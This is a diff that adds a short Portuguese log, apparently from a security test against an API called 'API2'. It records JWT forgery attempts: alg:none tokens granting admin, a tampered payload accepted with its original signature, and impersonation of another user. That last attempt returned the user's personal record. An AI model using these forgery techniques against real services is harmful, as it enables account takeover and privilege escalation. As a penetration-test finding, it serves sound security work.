@@ -1,0 +1,15 @@
+# Forja de JWT (API2) — a assinatura não é verificada
+
+# Header do token legítimo: {"alg":"RS256"}
+# Payload do token legítimo: {'sub': 'atacante@teste.local', 'iat': 1792591523, 'exp': 1793196323, 'role': 'user'}
+# Token legítimo -> dashboard: HTTP 200
+----------------------------------------------------------------
+# A) alg:none, role=admin (sem assinatura):
+#    -> HTTP 200
+# B) payload adulterado (role=admin) + assinatura original:
+#    -> HTTP 200
+# C) alg:none, sub=adam007@example.com (impersonação de outro usuário):
+#    -> HTTP 200  {"id":1,"name":"Adam","email":"adam007@example.com","number":"9876895423","picture_url":null,"video_url":"data:image/jpeg;base64,OFHZ1HrLkz2+cA==","video_name":"Adam_video","available_credit":100.0,"v
+----------------------------------------------------------------
+# Prova: o servidor aceita tokens sem assinatura válida (alg:none) e tokens
+# com payload adulterado. Permite virar admin e personificar qualquer usuário.
